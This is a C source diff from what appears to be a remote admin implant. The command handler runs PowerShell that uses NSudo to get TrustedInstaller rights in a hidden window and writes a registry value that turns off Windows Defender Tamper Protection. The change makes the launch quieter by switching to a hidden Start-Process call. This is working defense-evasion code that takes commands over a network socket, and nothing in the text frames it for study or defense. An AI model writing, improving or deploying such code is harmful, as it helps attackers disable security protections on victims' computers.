@@ -205,7 +205,7 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             "Expand-Archive -Path $zip -DestinationPath $out -Force; "
             "$exe = Join-Path $out 'x64\\NSudo.exe'; "
             "if (Test-Path $exe) { "
-            "& $exe -U:T -ShowWindowMode:Hide reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features' /v TamperProtection /t REG_DWORD /d 4 /f; "
+            "Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait; "
             "Write-Host 'Tamper Protection disabled'; "
             "} else { Write-Host 'NSudo.exe not found after extraction'; }\"";
         result = sys_run_command(ps);
